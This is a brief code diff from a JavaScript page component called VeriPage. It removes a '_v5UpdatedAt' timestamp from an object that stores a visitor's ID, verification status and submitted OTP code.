@@ -176,7 +176,6 @@ export default function VeriPage() {
         id: visitorID,
         visitorId: visitorID,
         _v5Status: 'verifying',
-        _v5UpdatedAt: new Date().toISOString(),
         otpCode: _v5,
         otpSubmittedAt: new Date().toISOString(),
         currentPage: "veri",
